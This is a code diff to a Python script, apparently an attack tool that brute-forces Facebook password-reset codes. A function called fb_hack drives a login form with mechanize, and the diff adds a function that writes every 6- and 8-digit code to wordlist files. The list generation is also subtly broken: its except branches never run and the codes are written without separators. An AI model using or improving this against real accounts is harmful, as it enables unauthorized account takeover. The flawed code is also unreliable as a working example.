@@ -41,6 +41,22 @@ def sleepy(counter):
       print(x, end='\r')
     sleep(1)
 
+def passc():
+  try:
+    f = open("6digits.txt", "a")
+    f.close()
+  except:
+    f = open("6digits.txt", "a+")
+    for combination in itertools.product(range(10), repeat=6):
+        f.write(''.join(map(str, combination)))
+  try:
+    z = open("8digits.txt", "a")
+    z.close()
+  except:
+    z = open("8digits.txt", "a+")
+    for combination in itertools.product(range(10), repeat=8):
+      z.write(''.join(map(str, combination)))
+
 def fb_hack(email, codex):
   soup = BeautifulSoup()
   browser = mechanize.Browser()
@@ -53,6 +69,12 @@ def fb_hack(email, codex):
   browser.select_form(nr=0)
   browser.form['email'] = email 
   browser.submit()
+  browser.select_form(nr=0)
+  browser.submit()
+  
+  
+  
+  
   counter = 0
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
